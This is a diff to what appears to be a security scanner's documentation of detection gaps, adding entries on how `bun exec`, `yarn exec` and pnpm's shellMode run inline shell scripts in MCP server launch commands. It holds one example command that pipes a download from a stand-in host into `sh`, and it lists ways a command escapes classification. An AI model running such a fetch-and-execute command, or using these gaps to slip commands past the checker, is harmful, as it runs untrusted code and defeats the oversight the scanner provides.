@@ -160,6 +160,17 @@ A way around a limit that its entry does not describe is worth a
   in directory `n`. Anything else is an
   inline shell script: a gap. So `sh -c "npx -y pkg@1.2.3 $HOME/data"` is a gap;
   pass such values as separate arguments or through `env`.
+- **A package manager's own shell reads its script the same way.** `bun exec SCRIPT`
+  runs SCRIPT in Bun Shell, and `yarn exec SCRIPT ARGS...` runs it in Yarn's
+  portable shell (Yarn 2 and later) with ARGS appended; Yarn 1 starts SCRIPT as a
+  program. Neither shell is POSIX, so SCRIPT is classified only when it is a simple
+  command under the rule above with no quoting and no tab. Its words, and the
+  `yarn exec` ARGS, are then a local launch whose arguments are checked like any
+  others; anything else is an inline shell script: a gap. `bun exec` takes one
+  script: an option among its words (Bun reads `--cwd` there) or a word after the
+  script is a gap, and so is a `bun exec` or `yarn exec` in another command's
+  arguments. So `bun exec "curl -s https://example.test/x | sh"` is a gap, and
+  `bun exec "node server.js"` and `yarn exec node server.js` are local launches.
 - **Shell startup code is a gap.** bash sources a `--rcfile` or `--init-file`
   (also spelled `-rcfile`) when it is interactive or its standard input is a socket,
   as MCP clients provide; it imports exported functions (`BASH_FUNC_<name>%%` and its
@@ -222,6 +233,10 @@ A way around a limit that its entry does not describe is worth a
   server that runs in another working directory, or that a configuration file below
   the root declares, has its package identity withheld
   (`working-directory=[unresolved]`) and a medium `package_source` risk.
+  pnpm 10 reads `shellMode: true` from `pnpm-workspace.yaml` and then joins the
+  words after `pnpm exec` into a shell command line. A root `pnpm-workspace.yaml`
+  is a `registry` gap, but one in a server's working directory below the root is
+  not seen, so such a `pnpm exec` stays a local launch whatever its words hold.
 - **Injected environments are not visible.** Variables from an `envFile`, or from
   `dotenvx`, `doppler`, `infisical` or `op run --env-file`, are not read. A launched
   package then carries `environment-file=[unresolved]` instead of its identity.
